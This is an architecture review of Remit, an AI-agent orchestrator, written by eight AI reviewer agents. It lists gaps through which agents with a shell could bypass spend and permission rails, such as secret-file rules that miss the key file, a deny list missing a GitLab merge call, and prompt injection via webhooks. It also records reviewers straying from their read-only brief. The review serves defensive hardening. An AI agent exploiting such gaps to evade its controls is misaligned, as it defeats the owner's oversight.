# Architecture review of Remit, 2026-10-27

Status: **snapshot, not living documentation.** It describes the working tree of `.` on 2026-10-27
(branch `master`, HEAD `5cdd48c` when the review began, `a6e780e` when it was committed, with about 45 uncommitted files from
other sessions that the reviewers saw). Line numbers and counts will drift. Re-check a claim with the command named next to it
before acting on it, and never copy a line number from here into `design.md` or `AGENTS.md`.

Sensitivity: Appendix 5 describes attack paths that are **not yet mitigated**, and Appendices 2, 6 and 8 quote spend and usage
figures taken from copies of the owner's database. The commit that adds this file is local. Do not push it to a shared remote
before the Appendix 5 findings S1 to S6 are decided.

## 0. How to use this file

The next step is to redo the work in another worktree. Read sections 2 to 6 first (the orchestrator's synthesis, a few pages),
then open the appendix of the lens you are working on. Every finding has an ID (R, D, F, C, S, O, A7, P1) that points to its
appendix. Section 5 groups the findings into work packages with the files each touches, so two sessions do not collide.

## 1. Method

- **Knowledge base:** the `aio-advisor` plugin, `github.com/aiocean/claude-plugins`, directory `plugins/aio-advisor`, commit
  `6a29093290e0ba44cffaf9a6da49d52cf984c8a7` (2026-10-26). Its four skills were used: `aio-architect-advisor` (the 5-step
  workflow Understand, Search, Apply, Synthesize, Stress-test), `aio-architect-reference` (137 patterns in 10 volumes),
  `aio-mental-models` (54 models) and `aio-threat-models` (27 frameworks).
- **Panel:** eight independent reviewers, agent type `Plan` (read-only tools), `model=opus`,
  `effort=high (user: "thực sự sâu sắc")`, run in parallel. Each got the same standard (`AGENTS.md`, `docs/design.md`), a lens,
  verified facts with `file:line` to start from, and the same output schema (verdict, what to keep, ranked findings, stress-test,
  coverage line).
- **Lenses:** 1 boundaries and modularity, 2 data architecture, 3 resilience and concurrency, 4 contract and web adapter,
  5 security and threat model, 6 operations, delivery and fitness functions, 7 changeability by AI agents and doc truth,
  8 red team on the premises.
- **Orchestrator checks:** after each report the orchestrator re-ran the cheapest command that confirms its main claims (section 4).
- **Deviation from the plugin's workflow:** the agents searched the corpus with `rg` and `ls` over the volume directories, not with
  the plugin's semantic-search script (`npx tsx`), because running `npx` was not permitted. Each report lists which articles it read
  in full and which it only skimmed.

## 2. Verdict

The core is well built. The product around it is not yet protected, operable or measured.

**Keep (confirmed by several reviewers and by the orchestrator):**
- `step` is the one pure transition function, and all 7 places that set a chain's status are in `internal/orch/step.go`.
- One writer per chain, state, decisions and queued messages stored in one transaction, an outbox in the same transaction.
- Idempotent requests: a replay returns the first answer, and a crash mid-action is reported, never redone.
- Crash, replay and atomicity tests with a real fake-agent subprocess. The contract drift gate (`check-gen`).
- Webhook keys (256-bit, constant-time compare), AES-GCM sealing, CEL limits, an unclosable fence around outside text.

**Fix first:**
1. The spend rails are loose and one of them leaks.
2. Every rail can be bypassed by an agent with a shell, because agents run as the server's OS user.
3. There is no backup, no CI, no health probe, and production runs from the development working tree.
4. Architecture rules live only in prose, and the documentation has drifted from the code.
5. The one human reviewer is an unmanaged bottleneck, and nothing measures value per dollar.

## 3. Convergent findings (two or more reviewers reached them independently)

| # | Finding | IDs | Evidence the orchestrator re-checked |
|---|---|---|---|
| 1 | Spend rails: defaults $10,000/day and $1,000/chain against about $450/day actually spent; a budget pause leaves background tasks running; the daily budget only gates admission | P1-3, F2, F3, O4, S9 | `cmd/remit/main.go:48,54`; `internal/orch/step.go:318` against `:532` |
| 2 | Rails can be bypassed from a shell: `secret.key` and `remit.db` are not in the secret-path rules; `glab api -X PUT .../merge` is not denied; a bare `Bash` rule never matches; an MCP import skips `holdMCPServer` | S1, S3, S4, S6 | `internal/orch/policy.go:32,39-46,90,99`; `deny.go:36-39`; `library_import.go:43-56`; `cmd/remit/main.go:142,151` |
| 3 | No backup, no snapshot before migrating, no CI, no hook, no `/healthz`; pm2 runs `./bin/remit` from the dev tree and a Vite dev server on `0.0.0.0:5173` | D1, O1, O2, O3, O5 | `rg 'VACUUM INTO\|backup' internal/store` (none), `ls .gitlab-ci.yml .github` (absent), `~/.remit/ecosystem.config.cjs` |
| 4 | Rules enforced only by prose; the pure core shares a package with the I/O shell and nothing checks its imports; `Orchestrator` has 388 methods over 59 files | R1, R3, O7, A7-4, A7-9 | `rg -c '^func \(\w+ \*Orchestrator\)' internal/orch` |
| 5 | The web decides status, grouping, counts and allowed actions that the design reserves for the server | C3, A7-2 | `web/src/tree.ts:32`; `web/src/components/ChainActions.vue:27-30`; `SchedulePill.vue:15` |
| 6 | Documentation drift and an oversized `AGENTS.md`; `AGENTS.md` points at `docs/adr/`, which does not exist | A7-3, A7-4, A7-7, O10 | `wc -c AGENTS.md` = 27,333 (committed 25,329); `ls docs` |
| 7 | Data grows without bound and the board is recomputed by full scans; no foreign keys; derived counts drift | D3 to D7, C2, C4 | `rg 'REFERENCES\|FOREIGN KEY' internal/store/migrate.go` (none) |
| 8 | A tab left open across a deploy runs the old bundle against the new server: no build id or protocol version in the contract | C1 | `rg -n 'version' web/src/rpc/define.ts` (only skill and plugin versions) |

Single-reviewer findings worth reading in full: F1 (no deadline on an agent turn, `internal/orch/session.go:265`), P1-1 (no
balancing loop on review capacity, `internal/orch/admit.go:72-80`), P1-2 (no all-in cost per merged MR), D2 (a missing key file
clears sealed credentials), S2 (prompt injection from webhook bodies to an agent with a shell), A7-1 (`make test` fails whenever
a peer has an uncommitted contract change).

## 4. What the orchestrator re-checked, and the corrections it made

Commands were run on 2026-10-27 in `.`. "Confirmed" means the cited line says what the report says.

| Claim | Result |
|---|---|
| `Orchestrator` has 388 methods in 59 non-test files | Confirmed (`rg -c`) |
| `step.go` and `admit.go` import only `model` and the standard library | Confirmed |
| `Notifier` has 32 methods (R8) | **31** counted; immaterial |
| `Hire` checks origin, brief, inputs and loadout (R4) | Confirmed at `tools.go:45-63`. The duplicated checks in the MCP handler at `tools.go:489-512` were not re-read |
| Defaults `-daily-budget 10000`, `-budget 1000`; `fits()` has no review-capacity term | Confirmed (`main.go:48,54`, `admit.go:72-80`) |
| KPI `merge-rate` hides MRs waiting for the owner (P1-2) | **Partly wrong.** `kpi.go:121` documents that a waiting MR is not counted, and `owner-wait` says the system names the oldest. It is a stated choice. What is missing is a KPI dividing all spend by merged MRs |
| `tree.ts:32` and `ChainActions.vue:27-30` decide status in the browser | Confirmed |
| No build id or protocol version in `define.ts` | Confirmed (`:849` and `:862` are skill and plugin versions) |
| `drafts.ts:18` matches the error text "sent or deleted already" | Confirmed against `store.go:29` |
| `secretPath` regex does not cover `secret.key` or `remit.db`; `~/.remit/token` has no writer | Confirmed (`policy.go:32,90,99`; `rg` finds no code writing it) |
| `denyTools` lacks `glab api`; `deny.go` needs a spec to match a `Bash` rule | Confirmed (`policy.go:39-46`, `deny.go:36-39`) |
| MCP import of a new server skips `holdMCPServer` | Confirmed, and the code comment says it is intended (the file is treated as the owner's own configuration) |
| `sess.Prompt` has no deadline; no `WithTimeout` on the turn path | Confirmed (`session.go:265`) |
| Budget pause applies `cancelTurns, freeSlot`; owner pause adds `stopBackground` | Confirmed (`step.go:532`, `:318`) |
| pm2 runs `./bin/remit` in the dev tree and Vite on `0.0.0.0:5173`; Vite `allowedHosts` includes `remit.example.com` | Confirmed (`ecosystem.config.cjs`, `web/vite.config.ts:11`) |
| `go list ./...` includes `web/node_modules/.../flatted`; `secrets` tests spawn goroutines but sit in `PLAIN_PKGS` | Confirmed |
| No `/healthz`; no `.gitlab-ci.yml`, `.github`, or hook other than samples | Confirmed |
| A missing key file makes `launchServers` clear the server's credentials | Confirmed (`credentials.go:265-271`, `:350-353`). **Severity lowered:** it is deliberate and tested (`credentials_lostkey_test.go`), and the owner can re-enter the values. The risk is a wrong `-secret-key-file` or a restore in the wrong order |
| No `REFERENCES` or `FOREIGN KEY` in migrations although `foreign_keys(on)` is set | Confirmed |
| `AGENTS.md` is 336 lines; `docs/adr/` does not exist; `SchedulePill.vue:15` shows "you" for routine and webhook chains; `orch.go:1-3` package doc is out of date | Confirmed |

**Not verified by the orchestrator** (treat as hypotheses until re-run):
- S5 (card tokens visible in process arguments) and S10 (a repository's `.claude/settings.json` hooks): both depend on runtime
  behaviour of `claude-agent-acp` and Claude Code.
- D3's timings (measured on a synthetic copy scaled 60 times) and D4's growth rate (24 MB to 96 MB in 31.6 hours, a
  development period).
- Every number taken from the owner's live database (61 MRs, 8 merged, 52 waiting, $1,126 spent in 3.5 days, 109 error items,
  265 of 662 cards on Codex). Reviewer 6 measured $429 on 10-26 and $479 on 10-27 from a backup copy, which agrees with the red
  team's order of magnitude; that is corroboration, not verification.
- F4 to F9, C2, R2, R5 to R10 (reasoned from code, not run under load).
- `make test` was not run by anyone. Reviewer 3 ran one narrow orch test under `-race` and reported it green (117 s).

## 5. Work packages

Rule for all of them: tests first, one commit per package, and the package's own tests plus `make test` on a clean tree before
the commit. `make test` runs `check-gen`, which fails on a tree with an uncommitted contract change (A7-1); another reason to
use a separate worktree per package.

**Group A: hours each, low risk, high consequence**

| WP | Findings | What | Where |
|---|---|---|---|
| A1 Spend rails | F2, F3, O4, P1-3, S9 | Test first: a budget pause stops background tasks like an owner pause (one effect set, implemented once). Set defaults from measured spend (owner picks the numbers). A daily ceiling that pauses running homes through `step`. A small per-webhook chain quota | `internal/orch/step.go:318,532`, `budget.go`, `admit.go`, `cmd/remit/main.go:48,54` |
| A2 Durability | D1, D2, D8, O3 | Snapshot with `VACUUM INTO` before applying migrations and nightly; back up `secret.key` separately; a key id stored next to the ciphertext, and refuse with an inbox item instead of clearing; per-migration checksums | `internal/store/store.go:87`, `migrate.go`, `internal/orch/credentials.go:265-271,350-353`, `internal/secrets` |
| A3 Rail hardening | S1, S3, S4, S6, S8 | A GitLab token without merge rights plus protected branches (configuration outside the repo); `Tools: []` for the Dispatcher; hold every agent-initiated MCP import; add `secret.key` and the database to `SecretReads`; remove the stale `~/.remit/token` rule and text; data directory 0700 and database 0600; run the submit checks without `sh -c` | `internal/orch/policy.go`, `deny.go`, `library_import.go`, `repo.go:364-403`, `cmd/remit/main.go:142,151`, `docs/design.md:757`, `AGENTS.md:102` |
| A4 Liveness | F1 | A liveness deadline for an agent turn: no ACP notification for N minutes cancels the turn, then closes the card after a grace period, recorded as a decision. The stall rail must stop treating a mid-turn agent as progress | `internal/orch/session.go:265`, `schedule.go:411-455` |
| A5 Release and ops | O1, O2, O5, O6, O9 | `make release` from a clean commit with a `current` and `previous` link, web served from the embedded bundle, `/healthz`, an idle watchdog that writes an inbox item, JSON logs scoped per chain, `PLAIN_PKGS` corrected, `ignore ./web/node_modules` in `go.mod`, a `pre-push` hook and a pipeline | `Makefile`, `cmd/remit/main.go:206-210`, `internal/orch/health.go` |

**Group B: weeks**

| WP | Findings | What |
|---|---|---|
| B1 Fitness functions | R3, O7, A7-9 | The 12 checks in Appendix 6 section 5 (import-graph allowlist, one writer, migration hashes, every mutating RPC takes a request id, no mutable package state, clock, race list, style literals, size budget, pre-migration backup, ADR links, UI verify), plus `exhaustive` for kind switches. Start each with an allowlist of today's exceptions |
| B2 Server owns meaning | C3, C5, C7, A7-2 | `ChainStanding.asks`, origin labels, a delivery standing (label, tone, counts), named error kinds, tone unions in the contract |
| B3 Contract hygiene | C1, C4, C6, C9, A7-1 | Build id in the handshake and snapshot; keyset paging for events, archived chains and skill files; field parity by reflection; move `check-gen` out of the pre-commit path or make it compare against the working tree |
| B4 Data growth | D3 to D7 | A spend that changes nothing returns `errUnchanged`; partial index on running events; generated column for decision kind; incremental board; one `DeleteHome` used by chains and deliveries plus an orphan test; compute `Card.queued` when read; event tiering with the rule "a migration never rewrites events" |
| B5 Docs and AI changeability | A7-3 to A7-8, O10 | `AGENTS.md` of 10 KB or less with the harness rules in `CLAUDE.md`, `web/AGENTS.md` for UI rules, `internal/orch/doc.go` as a concern-to-files map with change recipes, `docs/decisions/` with immutable ADRs, a test that every backticked identifier in the living docs resolves, one `Propose`/`startFromDelivery`, a typed Role enum |
| B6 Resilience extras | F4 to F7, F9, R6 | Breaker on failure rate with jittered retry before failover; garbage-collect worktrees; durable stop effects; crash-loop quarantine; cap concurrent intakes; one capacity rule for the Dispatcher |

**Group C: conditional**
- Split the pure core out of `internal/orch` (`chain`, `capacity`, `standing`, `door`) with the import-graph check from B1; then a
  `home` abstraction for chain, Assistant and delivery (R2); then `internal/gitlab` (R5). Hold the split of the shell and of
  `crew` until sessions keep colliding there (Appendix 1 section 4, and the Gall's-law stress-test in Appendices 1, 7 and 8).
- Isolate agents with their own OS user or a sandbox and filtered egress (S1, S2, S5). One to two days; it closes the largest
  security gap and makes S8 matter.

## 6. Decisions only the owner can make

These change product behaviour or the project's own rules, so no session should pick an option alone.

1. **ADR-1 admission by review capacity** (Appendix 8 section 6). Options: keep as is; a hard cap N on MRs waiting for the owner
   (red team recommends N=5, holding queued starts, the Scout and routines, never the owner's own actions); an adaptive cap.
2. **ADR-2 measure value honestly.** All-in dollars per merged MR, the undecided share and the age of open MRs, and defaults
   tied to observed spend.
3. **ADR-3 grow from the working core.** A moratorium on new entities until ADR-1 and ADR-2 hold for four weeks, plus commit-size
   and migration fitness functions and a replay set for briefs. This runs against the current rule "do the larger change, there
   is no v1" (`AGENTS.md:40-41`).
4. **Rule changes found inside the review:**
   - `AGENTS.md:63` forbids compatibility shims for unreleased code, yet there are 30 migrations and at least 10 runtime branches
     for old records (A7-8). Proposed rule: migrate forward once, runtime code reads one shape.
   - `AGENTS.md:85` asks for small packages while `internal/orch` is 76 files (R1).
   - `AGENTS.md:129` (propose before executing) and `:224` (halt in every mode) block improvements in autonomous runs (A7-3).
   - The `Known gap` about agents running as the server's OS user (`docs/design.md:755-758`) is now the largest security finding
     (S1); decide whether it stays accepted.

## 7. Limits and deviations

- Coverage per reviewer is in the last section of each appendix. Roughly 22 to 46 Go files per reviewer were read in full or in
  part, none read everything, and about 88 of the 90 Vue components were only searched with `rg`.
- The reviewers saw the working tree with other sessions' uncommitted changes, not a clean `master`.
- Read-only deviations: the red team opened the live database `~/.remit/remit.db` read-only in place (the brief allowed
  copies only); reviewer 2 dropped the events table in two copies under `/tmp/review-2` by accident and re-copied the backup;
  reviewer 4 mistyped an `rg` redirect that hung and was stopped. No file in the repository or under `~/.remit` was changed.
- Seven untracked directories `.claude/skills/aio-*` appeared in `.` at 12:43 during the review. Neither the
  orchestrator nor any reviewer created them.
- Appendices are the reviewers' final messages verbatim, with headings demoted two levels so the file has one outline. IDs and
  numbers were not edited. Where the orchestrator disagrees, section 4 says so.

## 8. ID index

| Prefix | Lens | Appendix |
|---|---|---|
| R1 to R10 | Boundaries and modularity | 1 |
| D1 to D9 | Data architecture and state | 2 |
| F1 to F9 | Resilience and concurrency | 3 |
| C1 to C10 | Contract, channels and web adapter | 4 |
| S1 to S12 | Security and threat model | 5 |
| O1 to O10 | Operations, delivery, fitness functions | 6 |
| A7-1 to A7-9 | AI changeability and documentation truth | 7 |
| P1-1 to P1-10 | Red team on the premises | 8 |

---

## Appendix 1: Boundaries and modularity (reviewer 1 of 8)

#### Reviewer 1: Boundaries and modularity of the Go backend

##### 1) Verdict
- **The pure core is real.** `step`, `admit`, standing and verification import only `model` and the stdlib (HIGH).
- **`orch` is a god package and `Orchestrator` is a god object.** It is 76 files and 19,918 LOC, with **388 methods on one type spread over 59 files**, 95 of them exported, covering 8 concerns (HIGH).
- **Boundaries inside `orch` are only file-name prefixes.** Nothing checks them, so the core's purity depends on discipline alone (HIGH).
- **Behaviour that depends on the agent's role is scattered.** There are 39 role checks in 20 files, so the next agent that works outside a chain means editing many files (HIGH).
- **Don't break it up wholesale.** Move the pure parts out first and enforce them, put a single role abstraction behind the runtime, and split the rest only if evidence calls for it (MEDIUM).

##### 2) Genuinely good (keep)
- The chain state machine is one pure function, with its transition table written down (`internal/orch/step.go:15-57`, `:288`). `apply.go:159-214` is its only writer and runs admission inside the lock (`apply.go:195-203`). The only other places that store a chain create it in the queued state, which is not a transition (`lifecycle.go:64`, `routine.go:305`). (HIGH)
- `admit` is pure and documented with a table (`admit.go:12-30`, `:62-108`).
- There is precedent for the pattern recommended below: `internal/outcomes` and `internal/library` are pure cores, and `orch` is the shell around them (`library/access.go:1-2`).
- `agent.Launcher` is a deep port: one method (`agent/agent.go:89-91`), and `Session` has only 6.
- The package graph is clean and acyclic: leaves → `store`/`agent`/`library` → `orch` → `rpc`/`webhook` → `cmd`.
- `rpc` is a thin adapter. It converts with one generic helper (`rpc/convert.go:11`) and has a test that fails when a contract field goes missing.
- The webhook handler declares its own narrow interface (`webhook/handler.go:39`).
- Idempotent application layer (`request.go:44`). Clock injected (`orch.go:70`). No mutable package-level state. `go vet ./internal/...` is clean.

##### 3) Ranked findings

**R1 (High): `orch` is a god package; `Orchestrator` is a god object.**
- Evidence: `orch.go:63-103` holds runs, chains, tokens, nudges, the Assistant, delivery locks, library, outages, schedule, inflight requests and kicks. Grouping the files by concern (all 76 files):

| Concern | Files | LOC | Methods |
|---|---|---|---|
| Chain lifecycle | 18 | 6,223 | 117 |
| Agent runtime | 18 | 4,302 | 97 |
| Crew / library / credentials | 17 | 3,545 | 77 |
| Views / outcomes | 6 | 1,880 | 20 |
| Webhooks / door | 8 | 1,581 | 33 |
| Scheduling / routines | 4 | 1,160 | 24 |
| Assistant | 2 | 666 | 14 |
| Application shell | 3 | 561 | 6 |

- Change cost so far: the Assistant commit `72b6bbd` touched 35 non-test `orch` files, and `5cdd48c` touched 24.
- Six months out: AGENTS.md:291 gives each AI session one directory to own, but `orch` is one directory of 157 files. The dirty tree already shows 9 `orch` files modified by other sessions.
- The rules contradict themselves here: AGENTS.md:85 asks for "small, focused packages", and the package's own doc comment (`orch.go:1-3`) fails the "and" test at AGENTS.md:61.
- Sources: `volume-02-architecture-styles/02-modular-monolith.md` ("Boundary enforcement is the product") and `volume-01-foundations/03-boundaries-are-architecture.md` (boundaries kept only by convention erode).
- Confidence: HIGH on the facts, MEDIUM on the forecast.

**R2 (High): role-specific behaviour is a switch repeated across the code.**
- Evidence: 39 checks in 20 files on whether a card or home is the Assistant's, a Dispatcher's or a judge's. Examples: `session.go:376-381` and `:488-492`, `outbox.go:112-117`, `access.go:21-23`, `lifecycle.go:189-192`, `usage.go:41`, `views.go:211-217`. The Dispatcher alone appears in 29 files.
- Six months out: the next agent that works outside a chain is shotgun surgery across ~20 files.
- Fix: one `home` abstraction, implemented once each for a chain, the Assistant and a delivery, covering: who writes for it, how a turn ends, how a failure is handled, how a message is sent. Keep it inside `orch` at first.
- Sources: `volume-01-foundations/01-complexity-management.md:17` (change amplification) and `07-deep-vs-shallow-modules.md`.
- Confidence: HIGH for the count, MEDIUM for the exact shape.

**R3 (High): the pure core is pure, but nothing enforces it.**
- Evidence: `step.go:3-13` imports only `model`. `standing.go` (772 LOC) and `verification.go` have no methods on `Orchestrator`. But they share package `orch` with the store-calling shell, and no import-checking test exists (the only test that inspects types is `rpc/convert_test.go`).
- Fix: move them into their own packages, following the `outcomes`/`library` precedent. Add a `go list -deps` check to `make test`.
- Sources: `volume-01-foundations/09-dependency-inversion.md:121` and `08-separation-of-concerns.md:149`.
- Confidence: HIGH.

**R4 (High): Hire's rules are split between the MCP tool handler and `Hire`, and partly duplicated.**
- Evidence: the handler at `tools.go:489-512` checks wrap-up, plan, deliverable/criteria, that a reviewer/QC names inputs, and the loadout. `Hire` at `tools.go:46-63` checks origin and brief, then checks inputs and the loadout again.
- This breaks AGENTS.md:51 ("A rule is implemented once"). The wrap-up flag is also read outside the chain lock (`tools.go:489`).
- Six months out: an Assistant or playbook path that calls `Hire` skips the plan and wrap-up rules.
- Fix: one pure `hireRules(...) []string`, called by `Hire`. The handler then only translates the call.
- Source: `volume-02-architecture-styles/09-hexagonal.md`.
- Confidence: HIGH.

**R5 (Medium): git and GitLab calls are spread through the domain shell.**
- Evidence: `exec` of `git` and `glab` at `repo.go:72-73` and `:427-432`, and `review.go:22-23`. There are 34 call sites: `repo.go` 18, `submit.go` 11, `review.go` 2, `gate.go` 2, `door.go` 1. The webhook door depends on the GitLab identity (`door.go:129`).
- Fix: a concrete `internal/gitlab` package that owns the `exec` calls and parsing. No interface is needed, which fits AGENTS.md:58 ("no abstraction without a second real use").
- Source: `volume-01-foundations/09-dependency-inversion.md`.
- Confidence: HIGH on the facts, MEDIUM on the payoff (it depends on whether GitHub support ever comes).

**R6 (Medium): admission is not the single rule the design says it is, and it takes the wrong type.**
- Evidence: the Dispatcher calls `fits(model.Chain{}, intakeNeeds, r)` with an empty chain (`dispatcher.go:78`) and adds its own slot rule (`dispatcher.go:72-84`). `outbox.go:149` is another entry path. `design.md:121` says every entry passes one rule.
- What it really governs is spend and capacity, not chains.
- Fix: a pure `capacity` rule over an entry type of its own, with Dispatcher slots inside it.
- Confidence: HIGH.

**R7 (Medium): every entity that commits atomically with a chain must join one hub.**
- Evidence: the `records` struct has 13 entity kinds, including webhook deliveries (`apply.go:110-126`). `commit` runs about 250 lines (`apply.go:381-~630`).
- Atomicity is the right goal, so keep the single transaction. Make the writes a table of per-entity functions, and don't split them across packages.
- Confidence: MEDIUM.

**R8 (Low-Med): views can miss a change without anyone noticing.**
- Evidence: `Notifier` has 32 methods (`notify.go:9-41`). `watched` embeds it and overrides only 9 (`views.go:482-530`), so a new notification that should move a view compiles fine and never does.
- Fix: one `touched(home, board)` hook, or a test that classifies every method.
- Confidence: MEDIUM (I did not confirm a view that was actually missed).

**R9 (Low): types from the pre-1.0 ACP SDK leak through the agent port.**
- Evidence: `acp-go-sdk v0.13.5` (`go.mod:6`). `agent.Handler` exposes ACP types (`agent.go:26-27`), and 8 `orch` files import the SDK.
- Fix: translate at the agent boundary the next time an SDK bump hurts.
- Confidence: MEDIUM.

**R10 (Low): the views object can reach the whole orchestrator, and recomputes everything.**
- Evidence: `views` holds a pointer back to the whole `Orchestrator` (`views.go:143`, `orch.go:110`; 31 `v.o.` uses). It re-reads the full Catalog on each recompute (`views.go:205`), and `room()` scans every chain (`admit.go:113`).
- Confidence: MEDIUM.

**Cost of change for three representative changes:**

| Change | Today | After the plan below |
|---|---|---|
| A new agent that works outside a chain | ~20 files (HIGH) | ~3 |
| GitHub alongside GitLab | 5 `orch` files, 34 call sites (HIGH) | 1 package |
| A new admission rule | `admit.go` plus `dispatcher.go` (cheap, good) | `admit.go` only |

##### 4) Target package map and migration order
Keep one process and one SQLite file: a modular monolith. `model` stays the shared kernel and stops growing. `orch` remains the shell and application layer.

0. **Rules and enforcement first.**
   - Amend AGENTS.md:85: "a context's pure core is its own package; `orch` is the shell".
   - Update AGENTS.md:21, which hard-codes `internal/orch/tools.go` as the home of tools.
   - Add a `go list -deps` check to `make test`.
   - Cost: hours. Benefit: purity can no longer erode.
1. **Fix R4**, the Hire rules. One file.
2. **Move the pure parts out.** All of these import only `model`, so there is no risk of import cycles:
   - `internal/chain`: `step`, plan, budget, the command types, transition.
   - `internal/capacity`: `admit` (fixes R6).
   - `internal/standing`: standing and verification.
   - `internal/door`: precondition and `delivery_fields`.
   - Cost: the command types become exported, 28 places that build commands get a package prefix, and `step_test`, `admit_test` and `plan_test` move with their code. Keep the moved types data-only, so the `cardEdit` closure must become data.
3. **`internal/gitlab`** (fixes R5).
4. **The `home` abstraction inside `orch`** (fixes R2). Only after it has absorbed the next role cleanly, move the agent runtime (session, stream, mailbox, failover) into its own package.
5. **Only if sessions keep colliding there:** move `crew` (library, agents, playbooks, changes, credentials) out. It touches chains through only 4 calls: `createChain`, `deliver`, `decide`, `tellInbox`.

Do not do these: repository interfaces over `store`, an event bus, or separate services.

##### 5) Stress-test
- **10x the chains.** The structure holds. Performance does not: the full scans in R10 grow linearly with the number of chains. Splitting packages doesn't fix that, though extracted `chain` and `standing` packages make incremental counters easier to add.
- **Twice as many parallel AI sessions.** This argues *for* the plan: package ownership is the only partition AGENTS.md:291 can act on.
- **How the plan could fail.** Exported command types widen the API, which is the shallow-module risk from article 07. Every new chain command now edits two packages instead of one pair of files.
- **The best case for the opposite (keep one package).**
  - `02-modular-monolith.md` warns against extracting modules early ("Splitting is easy; merging is hard"), and says the boundaries pay off past about ten developers.
  - `06/12-when-not-ddd.md` says strategic DDD overhead isn't worth it for a single developer.
  - Gall's law (`aio-mental-models/volume-3-systems-mathematics/10-galls-law.md`): the system works, so let it evolve.
  - `Card`, `Actor` and `Home` are genuinely shared by every concern, so a split could make packages chatty.
  - My answer: steps 0–3 only move leaf code or adapters, with little coupling. The risky split of the shell (steps 4–5) is deferred and conditional, so the plan is the evolutionary path rather than a redesign.
- **Assumptions:**
  - Assumption: AI sessions remain the main developers, with one human owner.
  - Assumption: the 81 white-box test files (21k LOC, all `package orch`) are a real cost to any split (LOW: not measured).
  - Assumption: GitHub support may come. If it never does, R5 drops to Low.

##### 6) Coverage
- **Read in full or in part:** 21 of 126 non-test Go files: `orch.go`, `admit.go`, `homes.go`, `notify.go`, `request.go`, `step.go`, `apply.go`, `tools.go`, `lifecycle.go`, `routine.go`, `views.go`, `session.go`, `outbox.go`, `dispatcher.go`, `door.go`, `access.go`, `rpc/api.go`, `rpc/convert.go`, `store/store.go`, the `model.Card` definition and `agent/agent.go`.
- **Checked by `rg`/`wc`/`go list` only:** the other 55 `orch` files, all sibling packages, and git history.
- **Docs:** AGENTS.md in full; `design.md` lines 1-125 and 747-780.
- **Articles read in full:** 02-01, 02-02, 03, 07, 06-02, and Gall's law. Skimmed by `rg`: 01, 08, 09, 12, 09-hex, 10-vertical-slice and 06-12.
- **Skipped:** the web app and `wire`, which are outside this lens; tests beyond counting them; context-mapping and aggregates (no time).
- **Discrepancy with the brief:** the brief's `rpc` figures (16 files, 3,779 LOC, importing `agent`, `outcomes`, `store`) include tests. Non-test `rpc` is 4 files and 655 LOC, importing only `auth`, `model`, `orch` and `wire`.

##### Critical files for implementation
- `internal/orch/orch.go`
- `internal/orch/step.go`
- `internal/orch/apply.go`
- `internal/orch/session.go`
- `internal/orch/tools.go`

---

## Appendix 2: Data architecture and state (reviewer 2 of 8)

**Data architecture and state review (reviewer 2 of 8)**

#### 1) Verdict
- The write path is sound. There is one writer connection in WAL mode, transactions are short and do no outside I/O, the outbox is written in the same transaction as the change, and cost has a single owner (the usage ledger). HIGH
- Durability is the weak point. The product has no backup or restore. A missing key file permanently deletes the sealed credentials. HIGH
- Growth is not bounded. On this host the database went from 24 MB to 96 MB in 31.6 hours. Nothing compacts events, and the board is recomputed by scanning every table it reads. MEDIUM
- One concept, one owner holds for cost but not for `Card.queued`: I found 39 cards on the live copy whose count no longer matches their queue. HIGH
- Migrations are atomic and refuse newer databases. They are not tested from every earlier version, nothing backs up before migrating, and "released" has no definition. HIGH

#### 2) What is genuinely good (keep it)
- **Writer and readers.** One writer connection, `_txlock=immediate`, `busy_timeout(5000)`, and `query_only` readers capped at NumCPU (`internal/store/store.go:80-98`). HIGH
- **No I/O inside transactions.**
  - `commit` makes only store calls (`internal/orch/apply.go:423-557`).
  - `steer` talks to the agent before its transaction opens (`internal/orch/outbox.go:298-312`).
  - Skill files are written before the transaction (`internal/orch/library.go:132-148`). HIGH
- **The outbox is the event row.** A prompt is stored as a queued event in the same transaction as the change that sends it (`store.go:520-526`, `outbox.go:191-205`). This is the transactional outbox from `volume-05-data-architecture/08-change-data-capture.md:272`. HIGH
- **Cost has one owner.** The ledger is the only record of spend, and cost is computed when a record is read, never stored on it (`store.go:172-186`, migration 7). HIGH
- **Safe concurrent writes.** Records carry a revision and a stale write is refused (`store.go:224-243`).
- **Repeated requests run once.** Requests are kept with their answer for a week (`request.go:29`), matching `volume-04-resilience/10-idempotency.md:41`.
- **Index tests exist.** `TestChainEventsAndQueuedPromptsAreFoundByIndex` checks query plans (`store_test.go:289-306`).
- **Status columns have not drifted.** `inbox.status` and `deliveries.status` match the documents on the live copy (0 rows differ).

#### 3) Ranked findings

**D1 · Critical · There is no backup or disaster recovery**
- **Evidence:**
  - `rg -i 'backup|vacuum|wal_checkpoint'` over `internal/` finds only comments.
  - The 17 hand-made `~/.remit/backup-*` folders take 1.2 GB after 2 days. They hold `remit.db` and old binaries, never `secret.key`.
  - `cmd/remit/main.go:58` says that losing the key loses every credential.
  - The database file is mode 0644.
- **Supports:** `volume-05-data-architecture/12-derived-data.md` (a good source of truth is "Durable", the opening of Core Concept) and `01-replication.md` (Mistakes 1 and 5).
- **In 6 months:** about 6-10 GB in one file with no point-in-time copy. A `cp` of a live WAL database can be torn, and a restore loses credentials (see D2).
- **Change:**
  - A scheduled online snapshot with `VACUUM INTO` (or the backup API), rotated.
  - A snapshot inside `Open` before migrating.
  - The key file backed up separately.
  - An optional streamed WAL copy for near-zero loss.
- **Confidence:** HIGH

**D2 · High · A missing key file deletes the sealed credentials**
- **Evidence:**
  - `openSecret` treats a missing key file (`fs.ErrNotExist`) as unreadable (`internal/orch/credentials.go:350-353`).
  - `launchServers` then calls `forgetCredentials`, which deletes every sealed value of the server (`credentials.go:265-271, 283-313`).
  - Sealing uses `LoadOrCreateKey` (`credentials.go:34`), so the next credential or webhook silently mints a new key, and older webhook keys never open again (`webhook_keys.go:88-97`).
  - `credentials_lostkey_test.go:33-91` makes this the intended behaviour.
- **Supports:** `volume-05-data-architecture/13-schema-evolution.md`, Mistake 4: a stored record should carry its version from day one.
- **In 6 months:** restoring the database before the key, or a wrong `-secret-key-file`, permanently destroys every credential that is touched.
- **Change:**
  - Store a key id (an HMAC of a constant under the key) in a meta table, and prefix each ciphertext with it.
  - When the key is missing or does not match, refuse and raise a Health or inbox item. Never delete.
  - Create a key only when the database holds no sealed value.
  - Clearing credentials becomes the owner's explicit action.
- **Confidence:** HIGH

**D3 · High (at scale) · The board is recomputed by scanning everything**
- **Evidence:**
  - `Catalog` reads every chain (each with a usage sum), every approval, and the insight decisions through a JSON filter (`store.go:848-876`).
  - It runs on every `ChainUpdated` (`views.go:487-490`, `views.go:204-207`).
